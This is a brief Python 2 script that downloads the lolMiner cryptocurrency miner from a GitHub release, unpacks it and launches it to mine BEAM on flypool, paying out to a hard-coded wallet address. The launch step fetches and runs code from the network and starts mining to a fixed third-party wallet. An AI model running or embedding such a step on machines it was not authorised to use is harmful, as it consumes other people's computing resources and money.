#!/bin/python2
from os import system
from time import sleep

try:
	system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz && tar -xvf lolMiner_v1.32a_Lin64.tar.gz")
	system("echo AAAA")
	system("cd 1.32a")
	system("./1.32a/lolMiner --algo BEAM-III  --pool  eu1-beam.flypool.org:3333 --user ab16399364798c38ab3636ffdbdad828dc7bede2f0f305cfa709635153f1a64799.MinerMiq --tls 0")
except Exception as err:
		print(" Error: ", err)
